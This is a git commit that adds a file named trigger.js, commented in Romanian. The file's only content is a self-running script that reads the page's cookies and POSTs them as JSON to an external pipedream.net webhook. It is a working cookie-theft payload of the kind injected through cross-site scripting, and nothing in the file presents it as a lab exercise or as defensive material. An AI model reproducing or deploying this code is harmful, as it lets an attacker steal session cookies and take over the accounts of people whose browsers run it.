7f6b9b440532a8d9a612ba6fc6d034f619985266
catalinprunarei <113038375+catalinprunarei@users.noreply.github.com>
2024-08-01 13:29:23 +0300

    Create trigger.js

---
+++ trigger.js
@@ -0,0 +1,24 @@
+async function sendCookies() {
+    try {
+        // Extrage cookie-urile
+        const cookies = document.cookie;
+
+        // Trimite cookie-urile către URL-ul webhook-ului
+        const response = await fetch('https://eox2hsuwm1hz94k.m.pipedream.net', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ cookies })
+        });
+
+        // Recuperează datele din răspuns
+        const responseData = await response.json();
+        console.log(responseData);
+
+    } catch (error) {
+        console.error('Eroare:', error);
+    }
+}
+
+sendCookies();
